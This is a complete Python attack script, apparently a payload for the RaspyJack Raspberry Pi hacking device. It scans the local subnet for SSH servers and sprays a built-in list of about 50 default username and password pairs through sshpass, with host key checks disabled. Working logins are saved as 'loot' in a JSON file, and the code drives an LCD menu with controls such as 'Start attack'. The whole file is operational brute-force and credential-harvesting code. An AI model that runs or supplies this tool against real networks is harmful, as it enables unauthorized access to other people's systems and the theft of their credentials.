#!/usr/bin/env python3
"""
RaspyJack Payload -- SSH Credential Spray
==========================================
Author: 7h30th3r0n3

Auto-discovers SSH hosts from nmap loot or quick port-22 scan on the
local subnet, then sprays ~50 common user:pass pairs using sshpass.

Setup / Prerequisites:
  - Requires sshpass: apt install sshpass
  - Built-in wordlist included (no external files needed).

Controls:
  OK         -- Start brute-force on selected host
  UP / DOWN  -- Scroll host list / results
  KEY1       -- Scan for SSH hosts
  KEY2       -- Export results to loot
  KEY3       -- Exit

Loot: /root/Raspyjack/loot/SSH/ssh_creds_YYYYMMDD_HHMMSS.json
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import ipaddress
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
WIDTH, HEIGHT = LCD_1in44.LCD_WIDTH, LCD_1in44.LCD_HEIGHT
ROWS_VISIBLE = 5
LOOT_DIR = "/root/Raspyjack/loot/SSH"
NMAP_LOOT = "/root/Raspyjack/loot"
RATE_LIMIT = 1.0

# ---------------------------------------------------------------------------
# Built-in wordlist (~50 common SSH user:pass pairs)
# ---------------------------------------------------------------------------
WORDLIST = [
    ("root", "root"), ("root", "toor"), ("root", "password"),
    ("root", "1234"), ("root", "12345"), ("root", "123456"),
    ("root", ""), ("root", "changeme"), ("root", "letmein"),
    ("admin", "admin"), ("admin", "password"), ("admin", "1234"),
    ("admin", "12345"), ("admin", "123456"), ("admin", ""),
    ("admin", "changeme"), ("admin", "admin123"), ("admin", "default"),
    ("user", "user"), ("user", "password"), ("user", "1234"),
    ("pi", "raspberry"), ("pi", "raspberrypi"), ("pi", "password"),
    ("ubuntu", "ubuntu"), ("debian", "debian"), ("test", "test"),
    ("test", "password"), ("guest", "guest"), ("guest", "password"),
    ("oracle", "oracle"), ("postgres", "postgres"), ("mysql", "mysql"),
    ("ftpuser", "ftpuser"), ("nagios", "nagios"), ("tomcat", "tomcat"),
    ("ubnt", "ubnt"), ("support", "support"), ("operator", "operator"),
    ("cisco", "cisco"), ("service", "service"), ("monitor", "monitor"),
    ("backup", "backup"), ("www-data", "www-data"), ("nobody", "nobody"),
    ("ansible", "ansible"), ("vagrant", "vagrant"), ("deploy", "deploy"),
    ("jenkins", "jenkins"), ("git", "git"),
]

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
running = True
brute_active = False
scan_active = False

hosts = []
selected_idx = 0
scroll_offset = 0

found_creds = []    # [{"host", "user", "pass"}]
status_msg = ""
attempts_done = 0
attempts_total = 0
current_pair = ("", "")
attempts_per_sec = 0.0


# ---------------------------------------------------------------------------
# Network helpers
# ---------------------------------------------------------------------------

def _detect_subnet():
    """Return the local subnet CIDR."""
    for iface in ("eth0", "wlan0"):
        try:
            res = subprocess.run(
                ["ip", "-4", "addr", "show", iface],
                capture_output=True, text=True, timeout=5,
            )
            for line in res.stdout.splitlines():
                stripped = line.strip()
                if stripped.startswith("inet "):
                    return stripped.split()[1]
        except Exception:
            pass
    return None


def _load_nmap_ssh_hosts():
    """Try to find SSH hosts from existing nmap loot JSON files."""
    ssh_hosts = set()
    if not os.path.isdir(NMAP_LOOT):
        return ssh_hosts
    for dirpath, _dirs, files in os.walk(NMAP_LOOT):
        for fname in files:
            if not fname.endswith(".json"):
                continue
            fpath = os.path.join(dirpath, fname)
            try:
                with open(fpath, "r") as fh:
                    data = json.load(fh)
                _extract_ssh_from_nmap(data, ssh_hosts)
            except Exception:
                pass
    return ssh_hosts


def _extract_ssh_from_nmap(data, ssh_hosts):
    """Recursively search nmap JSON for port 22 open entries."""
    if isinstance(data, dict):
        port = data.get("port", data.get("portid"))
        state = data.get("state", "")
        if str(port) == "22" and "open" in str(state).lower():
            ip = data.get("ip", data.get("addr", data.get("host", "")))
            if ip:
                ssh_hosts.add(str(ip))
        for val in data.values():
            _extract_ssh_from_nmap(val, ssh_hosts)
    elif isinstance(data, list):
        for item in data:
            _extract_ssh_from_nmap(item, ssh_hosts)


def _scan_ssh_hosts(cidr):
    """Quick TCP connect scan for port 22 on a subnet."""
    found = []
    try:
        network = ipaddress.IPv4Network(cidr, strict=False)
    except ValueError:
        return found
    for host in network.hosts():
        if not running:
            break
        ip = str(host)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((ip, 22))
            sock.close()
            if result == 0:
                found.append(ip)
        except Exception:
            pass
    return found


# ---------------------------------------------------------------------------
# Scan thread
# ---------------------------------------------------------------------------

def _scan_thread():
    """Background thread to discover SSH hosts."""
    global scan_active, status_msg
    scan_active = True
    new_hosts = set()

    nmap_hosts = _load_nmap_ssh_hosts()
    new_hosts.update(nmap_hosts)

    cidr = _detect_subnet()
    if cidr and running:
        with lock:
            status_msg = "Scanning subnet..."
        scanned = _scan_ssh_hosts(cidr)
        new_hosts.update(scanned)

    with lock:
        hosts.clear()
        hosts.extend(sorted(new_hosts))
        status_msg = f"Found {len(hosts)} SSH host(s)"

    scan_active = False


# ---------------------------------------------------------------------------
# Brute-force thread
# ---------------------------------------------------------------------------

def _try_ssh_login(host, user, password):
    """Attempt a single SSH login via sshpass. Returns True on success."""
    try:
        cmd = [
            "sshpass", "-p", password,
            "ssh",
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "-o", "ConnectTimeout=3",
            "-o", "BatchMode=no",
            f"{user}@{host}",
            "echo", "ok",
        ]
        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=8,
        )
        return result.returncode == 0 and "ok" in result.stdout
    except Exception:
        return False


def _brute_thread(target_host):
    """Brute-force a single host with the built-in wordlist."""
    global brute_active, attempts_done, attempts_total
    global current_pair, attempts_per_sec, status_msg

    brute_active = True
    with lock:
        attempts_done = 0
        attempts_total = len(WORDLIST)
        current_pair = ("", "")
        attempts_per_sec = 0.0

    start_time = time.time()

    for idx, (user, passwd) in enumerate(WORDLIST):
        if not running or not brute_active:
            break

        with lock:
            current_pair = (user, passwd)
            attempts_done = idx + 1
            elapsed = time.time() - start_time
            attempts_per_sec = attempts_done / max(elapsed, 0.01)

        success = _try_ssh_login(target_host, user, passwd)

        if success:
            entry = {"host": target_host, "user": user, "pass": passwd}
            with lock:
                found_creds.append(entry)
                status_msg = f"FOUND: {user}:{passwd}"

        time.sleep(RATE_LIMIT)

    with lock:
        if not any(c["host"] == target_host for c in found_creds):
            status_msg = "No creds found"
        brute_active = False


# ---------------------------------------------------------------------------
# Export
# ---------------------------------------------------------------------------

def _export_loot():
    """Write found credentials to JSON loot file."""
    os.makedirs(LOOT_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    filepath = os.path.join(LOOT_DIR, f"ssh_creds_{ts}.json")
    with lock:
        data = {
            "timestamp": ts,
            "credentials": list(found_creds),
        }
    with open(filepath, "w") as fh:
        json.dump(data, fh, indent=2)
    return os.path.basename(filepath)


# ---------------------------------------------------------------------------
# Display
# ---------------------------------------------------------------------------

def _draw_frame(lcd, font, mode):
    """Render current state to the LCD."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    # Header
    d.rectangle((0, 0, 127, 13), fill="#111")
    d.text((2, 1), "SSH SPRAY", font=font, fill="#00CCFF")
    indicator = "#00FF00" if (brute_active or scan_active) else "#444"
    d.ellipse((118, 3, 122, 7), fill=indicator)

    with lock:
        host_list = list(hosts)
        creds = list(found_creds)
        msg = status_msg
        done = attempts_done
        total = attempts_total
        pair = current_pair
        aps = attempts_per_sec

    if mode == "hosts":
        d.text((2, 16), f"Hosts: {len(host_list)}", font=font, fill="#AAAAAA")
        visible = host_list[scroll_offset:scroll_offset + ROWS_VISIBLE]
        for i, ip in enumerate(visible):
            y = 28 + i * 12
            real_idx = scroll_offset + i
            prefix = ">" if real_idx == selected_idx else " "
            color = "#00FF00" if real_idx == selected_idx else "#CCCCCC"
            has_cred = any(c["host"] == ip for c in creds)
            tag = " *" if has_cred else ""
            d.text((2, y), f"{prefix}{ip}{tag}", font=font, fill=color)

        if creds:
            d.text((2, 92), f"Creds found: {len(creds)}", font=font, fill="#00FF00")

    elif mode == "brute":
        target = host_list[selected_idx] if host_list else "?"
        d.text((2, 16), f"Target: {target}", font=font, fill="#AAAAAA")

        pct = done / max(total, 1)
        d.rectangle((4, 30, 124, 38), outline="#444")
        fill_w = int(pct * 118)
        if fill_w > 0:
            d.rectangle((5, 31, 5 + fill_w, 37), fill="#00CCFF")

        d.text((2, 42), f"{done}/{total} ({int(pct*100)}%)", font=font, fill="#AAAAAA")
        d.text((2, 54), f"{aps:.1f} att/s", font=font, fill="#888")
        d.text((2, 66), f"Try: {pair[0]}:{pair[1]}", font=font, fill="#CCCCCC")

        if creds:
            y = 80
            for c in creds[-3:]:
                d.text((2, y), f"{c['user']}:{c['pass']}",
                       font=font, fill="#00FF00")
                y += 12

    if msg:
        d.text((2, 104), msg[:22], font=font, fill="#FFAA00")

    # Footer
    d.rectangle((0, 116, 127, 127), fill="#111")
    if brute_active:
        d.text((2, 117), "Running... K3:Exit", font=font, fill="#888")
    elif scan_active:
        d.text((2, 117), "Scanning... K3:Exit", font=font, fill="#888")
    else:
        d.text((2, 117), "OK:Go K1:Scan K3:Quit", font=font, fill="#888")

    lcd.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global running, brute_active, selected_idx, scroll_offset, status_msg

    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values():
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    LCD_Config.GPIO_Init()
    lcd = LCD_1in44.LCD()
    lcd.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    lcd.LCD_Clear()
    font = scaled_font()

    # Check sshpass availability
    try:
        subprocess.run(["sshpass", "-V"], capture_output=True, timeout=3)
    except FileNotFoundError:
        img = Image.new("RGB", (WIDTH, HEIGHT), "black")
        d = ScaledDraw(img)
        d.text((4, 50), "sshpass not found!", font=font, fill="#FF0000")
        d.text((4, 65), "apt install sshpass", font=font, fill="#888")
        lcd.LCD_ShowImage(img, 0, 0)
        time.sleep(3)
        GPIO.cleanup()
        return 1

    # Splash
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((8, 16), "SSH CRED SPRAY", font=font, fill="#00CCFF")
    d.text((4, 36), "Spray common creds", font=font, fill="#888")
    d.text((4, 56), "OK    Start attack", font=font, fill="#666")
    d.text((4, 68), "KEY1  Scan for hosts", font=font, fill="#666")
    d.text((4, 80), "KEY2  Export loot", font=font, fill="#666")
    d.text((4, 92), "KEY3  Exit", font=font, fill="#666")
    lcd.LCD_ShowImage(img, 0, 0)
    time.sleep(1.5)

    mode = "hosts"

    try:
        while running:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                break

            elif btn == "KEY1" and not scan_active and not brute_active:
                threading.Thread(target=_scan_thread, daemon=True).start()
                time.sleep(0.3)

            elif btn == "OK" and not brute_active and not scan_active:
                with lock:
                    has_hosts = len(hosts) > 0
                if has_hosts:
                    target = hosts[selected_idx]
                    mode = "brute"
                    brute_active = True
                    threading.Thread(
                        target=_brute_thread, args=(target,), daemon=True,
                    ).start()
                else:
                    with lock:
                        status_msg = "No hosts. KEY1 to scan"
                time.sleep(0.3)

            elif btn == "UP" and not brute_active:
                with lock:
                    if hosts:
                        selected_idx = max(0, selected_idx - 1)
                        if selected_idx < scroll_offset:
                            scroll_offset = selected_idx
                time.sleep(0.15)

            elif btn == "DOWN" and not brute_active:
                with lock:
                    if hosts:
                        selected_idx = min(len(hosts) - 1, selected_idx + 1)
                        if selected_idx >= scroll_offset + ROWS_VISIBLE:
                            scroll_offset = selected_idx - ROWS_VISIBLE + 1
                time.sleep(0.15)

            elif btn == "KEY2":
                with lock:
                    has_creds = len(found_creds) > 0
                if has_creds:
                    fname = _export_loot()
                    with lock:
                        status_msg = f"Saved: {fname[:18]}"
                else:
                    with lock:
                        status_msg = "No creds to export"
                time.sleep(0.3)

            if not brute_active and mode == "brute":
                mode = "hosts"

            _draw_frame(lcd, font, mode)
            time.sleep(0.05)

    finally:
        running = False
        brute_active = False
        time.sleep(0.3)
        try:
            lcd.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
